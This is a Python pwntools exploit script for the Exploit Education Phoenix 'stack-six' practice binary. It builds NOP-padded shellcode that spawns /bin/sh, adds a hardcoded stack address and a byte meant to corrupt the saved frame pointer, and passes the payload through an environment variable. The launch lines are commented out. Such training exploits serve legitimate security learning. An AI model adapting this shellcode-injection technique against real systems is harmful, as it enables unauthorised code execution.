#!/usr/bin/python
from pwn import *

GDBSCRIPT = """
b start_level
continue
"""

BUFF_LEN = 128              # Max input to ensure "maxSize = 127"
TARGET_BP = 0x7fffffffe4a2
GREET_BP_LOCATION_GDB = 0x7fffffffe520  # Location of BP in greet() function
CORRUPT_BYTE = 0x08         # This value is what we want to put in the last byte of the RBP
                            # GREE_BP_LOCATION_GDB backs it up 24 bytes which is where our addr to shellcode needs to go

def exploit():
    # Generate Shellcode -- Spawns /bin/sh via execve
    ctx = context.update(arch="amd64", os="linux", endian="little")
    shellcode = asm(shellcraft.amd64.linux.sh())
    sclen = len(shellcode)

    print(f"Total bytes available: {BUFF_LEN}")
    print(f"Bytes of shellcode: {sclen}")
    print(f"Bytes left over: {BUFF_LEN-sclen-8-2}")

    # More math!
    numberNops = (BUFF_LEN - sclen) - 8 - 2 # 8 --> bytes for TARGETBP
                                            # 2 --> bytes for CORRUPT_BYTE in last two position in payload

    sc = asm('nop') * ((numberNops // 2) - 15)
    sc += shellcode
    sc += asm('nop') * ((numberNops // 2) + 15)
    sc += p64(TARGET_BP)
    sc += p8(CORRUPT_BYTE) * 2
    print(sc)
    print(len(sc))

    # Build payload -- NOPS + SHELLCODE + NOPS + TARGETBP + CORRUP_BYTE
    

    ENV = {"ExploitEducation": sc}

    # Execute the payload!
#    p = process("/opt/phoenix/amd64/stack-six", env=ENV)
#    p = "/opt/phoenix/amd64/stack-five"
#    gdb.debug(p, GDBSCRIPT)
#    gdb.attach(p, GDBSCRIPT)
    #p.sendline(sc)
    #p.interactive()

if __name__ == "__main__":
    exploit()
